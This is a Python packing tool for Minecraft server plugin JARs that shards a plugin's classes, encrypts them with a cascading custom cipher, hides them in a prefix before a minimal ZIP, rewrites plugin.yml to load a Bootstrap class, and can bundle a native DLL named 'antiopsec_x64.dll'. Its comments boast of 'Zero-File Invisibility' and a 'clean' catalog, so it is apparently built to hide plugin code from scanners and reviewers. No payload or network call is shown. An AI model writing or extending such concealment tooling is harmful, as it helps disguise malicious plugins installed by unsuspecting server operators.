import os
import sys
import struct
import io
import zipfile
import hashlib

MAGIC_HEADER = 0x434F4F4B49454653  # "COOKIEFS"

def derive_cascading_key(prev_key: int, payload_bytes: bytes) -> int:
    h = hashlib.sha256(payload_bytes + struct.pack(">I", prev_key & 0xFFFFFFFF)).digest()
    key = 0
    for b in h[:4]:
        key = ((key << 8) | b) & 0xFFFFFFFF
    return (key ^ 0x5D) & 0xFF

def encrypt_payload(data: bytes, key_seed: int) -> bytes:
    out = bytearray(len(data))
    rk = key_seed & 0xFF
    for i in range(len(data)):
        p = data[i]
        out[i] = ((p + (i & 0x0F)) & 0xFF) ^ rk
        rk = ((rk * 37) ^ p) & 0xFF
    return bytes(out)

def decrypt_payload(data: bytes, key_seed: int) -> bytes:
    out = bytearray(len(data))
    rk = key_seed & 0xFF
    for i in range(len(data)):
        e = data[i] & 0xFF
        val = (e ^ rk) & 0xFF
        p = (val - (i & 0x0F)) & 0xFF
        out[i] = p
        rk = ((rk * 37) ^ p) & 0xFF
    return bytes(out)

def pack_jar_with_polyglot_prefix(input_obf_jar: str, output_final_jar: str, bootstrap_cls_bytes: bytes, native_dll_path: str = None):
    """Packs 4 Shards into a Polyglot Header Prefix (Zero-File Invisibility, 100% Clean ZIP Catalog)."""
    all_entries = []
    with zipfile.ZipFile(input_obf_jar, 'r') as zin:
        for item in zin.infolist():
            fn = item.filename
            if fn.startswith('META-INF/') or fn in ['plugin.yml', 'bungee.yml', 'velocity-plugin.json']:
                continue
            if not fn.endswith('/'):
                all_entries.append((fn, zin.read(fn)))

    # 1. Distribute all entries into 4 balanced shards (~25% each)
    shards_zip_buffers = [io.BytesIO() for _ in range(4)]
    shards_zips = [zipfile.ZipFile(buf, 'w', compression=zipfile.ZIP_DEFLATED) for buf in shards_zip_buffers]

    for idx, (fn, data) in enumerate(all_entries):
        shard_idx = idx % 4
        shards_zips[shard_idx].writestr(fn, data)

    # Shard 4 holds Native DLL if provided
    if native_dll_path and os.path.exists(native_dll_path):
        with open(native_dll_path, 'rb') as df:
            shards_zips[3].writestr('assets/native/antiopsec_x64.dll', df.read())

    for z in shards_zips:
        z.close()

    raw_shards = [buf.getvalue() for buf in shards_zip_buffers]

    # 2. Cascading Key Derivation: K1 -> K2 -> K3 -> K4
    K0 = (0xAB ^ 0xF6) # 0x5D
    K1 = (K0 * 31 + 17) & 0xFF
    P1 = raw_shards[0]
    E1 = encrypt_payload(P1, K1)

    K2 = derive_cascading_key(K1, P1)
    P2 = raw_shards[1]
    E2 = encrypt_payload(P2, K2)

    K3 = derive_cascading_key(K2, P2)
    P3 = raw_shards[2]
    E3 = encrypt_payload(P3, K3)

    K4 = derive_cascading_key(K3, P3)
    P4 = raw_shards[3]
    E4 = encrypt_payload(P4, K4)

    # 3. Create Binary Prefix Payload
    prefix_payload = io.BytesIO()
    prefix_payload.write(struct.pack(">IIII", len(E1), len(E2), len(E3), len(E4)))
    prefix_payload.write(E1)
    prefix_payload.write(E2)
    prefix_payload.write(E3)
    prefix_payload.write(E4)
    payload_data = prefix_payload.getvalue()

    header_block = struct.pack(">QI", MAGIC_HEADER, len(payload_data)) + payload_data

    # 4. Create Standard Clean ZIP JAR containing ONLY 3 files (MANIFEST, plugin.yml, Bootstrap.class)
    jar_buf = io.BytesIO()
    with zipfile.ZipFile(input_obf_jar, 'r') as zin, zipfile.ZipFile(jar_buf, 'w', compression=zipfile.ZIP_DEFLATED) as zout:
        for item in zin.infolist():
            fn = item.filename
            if fn in ['plugin.yml', 'bungee.yml']:
                p_text = zin.read(fn).decode('utf-8')
                import re
                new_p = re.sub(r'main:\s*.*', 'main: cookie.fack.please.d111.Bootstrap', p_text)
                zout.writestr(item, new_p.encode('utf-8'))
            elif fn.startswith('META-INF/MANIFEST.MF'):
                zout.writestr(item, zin.read(fn))

        # Add single standalone Bootstrap class (Zero Inner Classes, Zero PNG, Zero DAT, Zero BIN)
        zout.writestr('cookie/fack/please/d111/Bootstrap.class', bootstrap_cls_bytes)

    base_jar_bytes = jar_buf.getvalue()

    # 5. Prepend Polyglot Header to create final invisible binary
    with open(output_final_jar, 'wb') as out_f:
        out_f.write(header_block)
        out_f.write(base_jar_bytes)

if __name__ == '__main__':
    if len(sys.argv) >= 4:
        cmd = sys.argv[1]
        if cmd == "pack":
            in_jar = sys.argv[2]
            out_jar = sys.argv[3]
            boot_cls_path = sys.argv[4]
            custom_icon = sys.argv[5] if len(sys.argv) > 5 else "NONE"
            native_dll = sys.argv[6] if len(sys.argv) > 6 and sys.argv[6] != "NONE" else None
            with open(boot_cls_path, 'rb') as bf:
                boot_bytes = bf.read()
            pack_jar_with_polyglot_prefix(in_jar, out_jar, boot_bytes, native_dll)
            print("[v] Successfully packed JAR with Polyglot Header Prefix (Zero-File Invisibility).")
